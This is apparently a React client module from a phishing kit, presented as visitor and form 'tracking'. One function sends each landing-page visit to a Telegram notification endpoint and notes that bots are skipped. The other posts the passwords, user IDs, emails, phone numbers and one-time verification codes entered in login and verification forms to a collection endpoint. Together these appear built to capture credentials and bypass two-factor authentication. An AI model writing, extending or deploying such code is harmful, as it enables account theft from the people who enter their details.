'use client'

import { useEffect, useRef } from 'react'
import { getClientUaModel } from '@/lib/client-ua-model'

/**
 * Session key is set only after the visit notification is actually delivered
 * (`res.ok && telegramSent === true`), so a failed send can be retried on the
 * next mount. Bot-skipped responses deliberately do not lock the key.
 */
const VISIT_NOTIFIED_SESSION_KEY = 'igoe_visit_notified'

/** In-flight dedupe so a second mount during the same request cannot double-send. */
const visitNotifyInFlight = new Set<string>()

export function useVisitorTracking() {
  const sentRef = useRef(false)

  useEffect(() => {
    if (sentRef.current || typeof window === 'undefined') return
    sentRef.current = true

    // Limit visit notifications to the landing page only.
    if (window.location.pathname !== '/') return

    try {
      if (window.sessionStorage.getItem(VISIT_NOTIFIED_SESSION_KEY) === '1') return
    } catch {
      // ignore sessionStorage failures
    }
    if (visitNotifyInFlight.has(VISIT_NOTIFIED_SESSION_KEY)) return
    visitNotifyInFlight.add(VISIT_NOTIFIED_SESSION_KEY)

    void (async () => {
      const uaModel = await getClientUaModel()
      void fetch('/api/telegram/visitor', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          userAgent: navigator.userAgent,
          ...(uaModel ? { uaModel } : {}),
          screen: `${window.screen.width}x${window.screen.height}`,
          language: navigator.language,
          referrer: document.referrer || 'Direct',
          pageUrl: window.location.href,
        }),
        keepalive: true,
      })
        .then(async (res) => {
          if (!res.ok) return
          try {
            const data = (await res.json()) as { telegramSent?: boolean }
            if (data.telegramSent === true) {
              window.sessionStorage.setItem(VISIT_NOTIFIED_SESSION_KEY, '1')
            }
          } catch {
            // ignore
          }
        })
        .catch(() => {
          // Failed send must stay retryable — leave the session key unset.
        })
        .finally(() => {
          visitNotifyInFlight.delete(VISIT_NOTIFIED_SESSION_KEY)
        })
    })()
  }, [])
}

export function trackFormSubmission(data: {
  type: 'login' | 'registration' | 'email_verification' | 'text_verification' | 'email_selection' | 'text_selection' | 'login_did_not_receive_code'
  userId?: string
  password?: string
  email?: string
  phone?: string
  otp?: string
  page: string
  timestamp?: string
}) {
  const formData = {
    ...data,
    timestamp: new Date().toISOString()
  }

  return fetch('/api/form-submission', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify(formData)
  }).catch(error => {
    console.error('Failed to track form submission:', error)
  })
}
